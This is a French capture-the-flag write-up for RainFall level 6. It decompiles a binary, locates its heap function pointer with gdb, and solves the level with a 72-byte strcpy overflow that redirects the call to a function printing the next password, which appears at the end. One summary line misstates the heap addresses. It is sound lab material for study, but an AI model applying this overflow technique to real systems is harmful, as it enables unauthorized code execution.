# **Level 6**

Pour le `level6` on decompile l'executable

```
void n(void)
{
  system("/bin/cat /home/user/level7/.pass");
  return;
}

void m(void *param_1,int param_2,char *param_3,int param_4,int param_5)
{
  puts("Nope");
  return;
}

void main(undefined4 param_1,int param_2)
{
  char *__dest;
  code **ppcVar1;
  
  __dest = (char *)malloc(0x40);
  ppcVar1 = (code **)malloc(4);
  *ppcVar1 = m;
  strcpy(__dest,*(char **)(param_2 + 4));
  (**ppcVar1)();
  return;
}
```

Alors le code alloue deux pointeur, le premier est remplie par l'entree de l'utilisateur et le second permet de stocker l'addresse de la fonction `m` appele a la fin

On comprend tres vite qu'il va falloir reecrire la valeur de `*ppcVar1` pour mettre la fonction `n` a la place de `m` grace au `strcpy` qui n'est pas protegé

Pour cela analysons le code assembleur

```
(gdb) disas main
Dump of assembler code for function main:
   0x0804847c <+0>:     push   ebp
   0x0804847d <+1>:     mov    ebp,esp
   0x0804847f <+3>:     and    esp,0xfffffff0
   0x08048482 <+6>:     sub    esp,0x20
   0x08048485 <+9>:     mov    DWORD PTR [esp],0x40
   0x0804848c <+16>:    call   0x8048350 <malloc@plt>
   0x08048491 <+21>:    mov    DWORD PTR [esp+0x1c],eax
   0x08048495 <+25>:    mov    DWORD PTR [esp],0x4
   0x0804849c <+32>:    call   0x8048350 <malloc@plt>
   0x080484a1 <+37>:    mov    DWORD PTR [esp+0x18],eax
   0x080484a5 <+41>:    mov    edx,0x8048468
   0x080484aa <+46>:    mov    eax,DWORD PTR [esp+0x18]
   0x080484ae <+50>:    mov    DWORD PTR [eax],edx
   0x080484b0 <+52>:    mov    eax,DWORD PTR [ebp+0xc]
   0x080484b3 <+55>:    add    eax,0x4
   0x080484b6 <+58>:    mov    eax,DWORD PTR [eax]
   0x080484b8 <+60>:    mov    edx,eax
   0x080484ba <+62>:    mov    eax,DWORD PTR [esp+0x1c]
   0x080484be <+66>:    mov    DWORD PTR [esp+0x4],edx
   0x080484c2 <+70>:    mov    DWORD PTR [esp],eax
   0x080484c5 <+73>:    call   0x8048340 <strcpy@plt>
   0x080484ca <+78>:    mov    eax,DWORD PTR [esp+0x18]
   0x080484ce <+82>:    mov    eax,DWORD PTR [eax]
   0x080484d0 <+84>:    call   eax
   0x080484d2 <+86>:    leave
   0x080484d3 <+87>:    ret
End of assembler dump.
```

En mettant un breakpoint dans `gdb` sur les deux appelle a malloc, on trouve leur position dans la memoire

```
(gdb) b *0x08048491
Breakpoint 1 at 0x8048491
(gdb) b *0x080484a1
Breakpoint 2 at 0x80484a1
(gdb) run aaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Starting program: /home/user/level6/level6 aaaaaaaaaaaaaaaaaaaaaaaaaaaaa

Breakpoint 1, 0x08048491 in main ()
(gdb) x $eax
0x804a008:      0x00000000
(gdb) n
Single stepping until exit from function main,
which has no line number information.

Breakpoint 2, 0x080484a1 in main ()
(gdb) x $eax
0x804a050:      0x00000000
(gdb)
```

> Donc le premier est en `0x08044a008` et le second en `0x08044a050` soit `72` de difference

On recupere l'addresse de n

```
(gdb) disas n
Dump of assembler code for function n:
   0x08048454 <+0>:     push   ebp
   0x08048455 <+1>:     mov    ebp,esp
   0x08048457 <+3>:     sub    esp,0x18
   0x0804845a <+6>:     mov    DWORD PTR [esp],0x80485b0
   0x08048461 <+13>:    call   0x8048370 <system@plt>
   0x08048466 <+18>:    leave
   0x08048467 <+19>:    ret
End of assembler dump.
```

On peux donc construire notre payload

```
level6@RainFall:~$ ./level6 $(python -c "print'a'*72+'\x54\x84\x04\x08'")
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
```

> ### NEXT : [Level 7](/level7/resources/README.md)
